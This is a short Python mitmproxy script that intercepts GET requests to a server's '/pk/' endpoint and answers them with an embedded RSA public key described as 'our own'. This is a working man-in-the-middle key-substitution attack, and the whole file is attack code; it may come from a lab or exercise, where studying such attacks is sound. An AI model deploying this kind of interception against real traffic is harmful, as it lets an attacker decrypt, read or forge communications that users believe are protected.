import json
from mitmproxy import http
from Crypto.PublicKey import RSA


def response(flow: http.HTTPFlow) -> None:
    """Intercepts responses from the server"""
    # replace the server's public key with our own
    if flow.request.path == '/pk/' and flow.request.method == 'GET':
        flow.response = http.Response.make(
            200,
            '''-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsNAo+yCclITDhu3LEsSd
oZMQ22IJ/t6/Pq/maqKnT8LfS6y6ggj5t24mod74qqweJ+aFVO5FULG0ca0dpSdS
/q02AxGDuyYFXvmMuu++lLz/wAiJCB9qlvSvxSLFNDgrRoVkzUhjDmEkIIFViPFb
C0Z7GlJ8nw5/CgyONqJ0j3MZ8KCKPJIEVLc6TrmCFSR12H3QfuteSjQr+N4QoQWv
asuI8CCqyKuPKCrxzR02gnTXE8Vdrrv3nsl/prSsLjAwE2VfZC974mVMiYB0yxqn
evPXWZ7E0dlCY22Z4FOideU55wUm24S/LXMrT2kyggPZsmmSUozV59tRCfCgwhFc
qQIDAQAB
-----END PUBLIC KEY-----
''',
            {'content-type': 'text/plain'},
        )
